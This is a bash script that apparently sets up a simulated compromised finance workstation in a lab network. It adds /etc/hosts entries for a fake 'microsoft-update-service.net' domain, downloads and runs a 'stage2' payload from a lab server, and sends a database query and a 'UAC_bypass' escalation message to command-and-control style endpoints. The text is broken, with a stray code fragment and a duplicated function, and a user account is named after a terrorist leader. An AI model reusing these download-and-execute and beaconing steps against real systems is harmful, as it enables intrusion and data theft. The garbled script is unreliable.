#!/bin/bash

echo "FINANCE-PC-02 initializing..."

echo "172.25.1.10 corp-dc-01.internal.corp" >> /etc/hosts
echo "172.25.1.200 microsoft-update-service.net" >> /etc/hosts

sleep 60

service ssh start

lateral_infection() {
    sleep 30
    wget -q -O /tmp/lateral.exe "http://172.25.1.200:8080/stage2/lateral_payload.exe" || true
    chmod +x /tmp/lateral.exe
    /tmp/lateral.exe &
}

financial_data_access() {
    sleep 40
    FINANCIAL_QUERY="{\"query\":\"SELECT * FROM transactions WHERE amount > 10000\",\"database\":\"FinanceDB\",\"user\":\"osama.binladen\"}"
    curl -s -X POST -H "Content-Type: application/json" \
         -d "$FINANCIAL_QUERY" \
         "http://microsoft-update-service.net:8081/db_access" > /dev/null 2>&1 || true
}

privilege_escalation() {
    sleep 60
    curl -s -X POST -H "Content-Type: application/json" \
         -d "{\"method\":\"UAC_bypass\",\"target\":\"FINANCE-PC-02\",\"user\":\"osama.binladen\",\"elevated\":true}" \
         "http://microsoft-update-service.net:8081/escalate" > /dev/null 2>&1 || true
}access" > /dev/null 2>&1 || true
}

privilege_escalation() {
    sleep 300
    curl -s -X POST -H "Content-Type: application/json" \
         -d "{\"method\":\"UAC_bypass\",\"target\":\"FINANCE-PC-02\",\"user\":\"osama.binladen\",\"elevated\":true}" \
         "http://microsoft-update-service.net:8081/escalate" > /dev/null 2>&1 || true
}

lateral_infection &
financial_data_access &
privilege_escalation &

tail -f /dev/null
